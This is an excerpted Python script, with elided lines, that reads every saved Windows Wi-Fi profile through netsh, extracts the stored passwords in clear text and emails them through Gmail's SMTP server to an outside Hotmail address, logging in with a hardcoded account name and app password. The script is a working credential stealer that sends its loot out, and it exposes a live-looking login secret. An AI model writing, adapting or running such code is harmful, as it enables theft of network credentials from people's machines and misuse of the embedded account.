...
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode(encoding='latin')
...
if len(profile_names) != 0:
    for name in profile_names:
        ...
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode(encoding='latin')
        ...
        if re.search("Clave de seguridad                         : Ausente", profile_info):
            ...
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode(encoding='latin')
...
email["from"] = "Bernardo Conquet"
# To which email you want to send the email
email["to"] = "conquetber@hotmail.com"
...
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    ...
    smtp.login("conquetber", "kcyjerhamqnkadlm")
    # Send email.
